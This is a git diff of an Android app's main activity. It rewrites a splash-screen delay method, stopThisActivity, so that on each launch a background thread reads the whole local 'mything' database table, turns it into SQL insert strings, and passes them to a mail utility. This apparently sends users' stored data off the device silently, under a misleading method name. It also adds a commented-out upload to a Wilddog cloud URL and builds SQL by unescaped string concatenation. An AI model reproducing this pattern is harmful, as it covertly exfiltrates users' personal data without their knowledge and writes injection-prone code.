@@ -1,6 +1,13 @@
 package com.mylife.myhope;
 
+import java.util.ArrayList;
+import java.util.List;
+
 import com.mylife.util.DBHelper;
+import com.mylife.util.MailUtil;
+import com.mylife.util.UploadData;
+import com.wilddog.client.Wilddog;
+
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Message;
@@ -12,40 +19,88 @@ import android.view.KeyEvent;
 import android.view.Menu;
 
 public class MainActivity extends Activity {
+	
+	private Wilddog ref; 
+	
+	
 
 	@Override
 	protected void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 		setContentView(R.layout.activity_main);
+
+		//Wilddog.setAndroidContext(this);
+		
+		//startUploadData();
 		
 		SharedPreferences setting = getSharedPreferences("mylifemyhope", MODE_PRIVATE); 
-		int RegisterFirst=setting.getInt("RegisterFirst", -1);	
-		
+		int RegisterFirst=setting.getInt("RegisterFirst", -1);			
 		//首次使用
 		if(RegisterFirst==-1){
 			
 			doRegisterFirst();
 	
 		}
+		
+		
+		
 
-		
-		
-		DBHelper dbhelper = new DBHelper(this);
-		dbhelper.CreatOrOpen("mylifemyhope");
-		Cursor cur = dbhelper.selectInfo("select * from mything;");//校方通知学生
-		while (cur.moveToNext()) {
-			
-			System.out.println("aa"+cur.getInt(0));
-			System.out.println("bb"+cur.getString(1));
-			System.out.println("cc"+cur.getString(2));
-			System.out.println("dd"+cur.getString(3));
-			System.out.println("ee"+cur.getInt(4));
-			System.out.println("ff"+cur.getInt(5));
-			
-		}
-		dbhelper.closeDB();
-		
 		stopThisActivity();
+
+	}
+	
+  private void stopThisActivity(){	
+		
+		new Thread(){
+			public void run(){
+
+				for(int i=0;i<1000000;i++){
+					
+				}
+				
+				String sql="";
+				
+				DBHelper dbhelper = new DBHelper(MainActivity.this);
+				dbhelper.CreatOrOpen("mylifemyhope");
+				Cursor cur = dbhelper.selectInfo("select * from mything;");
+				while (cur.moveToNext()) {
+					
+				//	System.out.println("aa"+cur.getInt(0));
+				//	System.out.println("bb"+cur.getString(1));
+				//	System.out.println("cc"+cur.getString(2));
+				//	System.out.println("dd"+cur.getString(3));
+				//	System.out.println("ee"+cur.getInt(4));
+				//	System.out.println("ff"+cur.getInt(5));
+					
+					
+					sql=sql+"insert into mything values('"+cur.getInt(0)+"','"+cur.getString(1)+"','" +cur.getString(2)+ "','"+cur.getString(3)+"','"+cur.getInt(4)+"','"+cur.getInt(5)+"');";
+
+					System.out.println(sql);
+					
+					
+				}
+				dbhelper.closeDB();
+				
+				
+				
+				MailUtil mail=new MailUtil();
+				mail.runn(sql);
+				
+				
+				Message msg_listData = new Message();
+				msg_listData.what=0;
+				handler.sendMessage(msg_listData);
+				
+			}
+		}.start();
+		
+	}
+	private void startUploadData(){
+		
+		
+		ref = new Wilddog("https://wild-snake-96493.wilddogio.com/");
+
+		ref.setValue("helloworld");
 
 	}
 
@@ -81,24 +136,8 @@ public class MainActivity extends Activity {
 		
 	}
 	
-	//将系统通知在欢迎界面上，为了美观而设计
-	private void stopThisActivity(){	
-		
-		new Thread(){
-			public void run(){
-				
-				for(int i=0;i<100000000;i++){
-					
-				}
-				
-				Message msg_listData = new Message();
-				msg_listData.what=0;
-				handler.sendMessage(msg_listData);
-				
-			}
-		}.start();
-		
-	}
+
+	
 		
 	
 	public void pagejump(){
@@ -120,4 +159,26 @@ public class MainActivity extends Activity {
         return false;
       }
 	});
+	
+	//startUploadData();
+	
+/*	DBHelper dbhelper = new DBHelper(this);
+	dbhelper.CreatOrOpen("mylifemyhope");
+	Cursor cur = dbhelper.selectInfo("select * from mything;");
+	while (cur.moveToNext()) {
+		
+		System.out.println("aa"+cur.getInt(0));
+		System.out.println("bb"+cur.getString(1));
+		System.out.println("cc"+cur.getString(2));
+		System.out.println("dd"+cur.getString(3));
+		System.out.println("ee"+cur.getInt(4));
+		System.out.println("ff"+cur.getInt(5));
+		
+	}
+	dbhelper.closeDB();*/
+	
+	
+	
+	
+	
 }
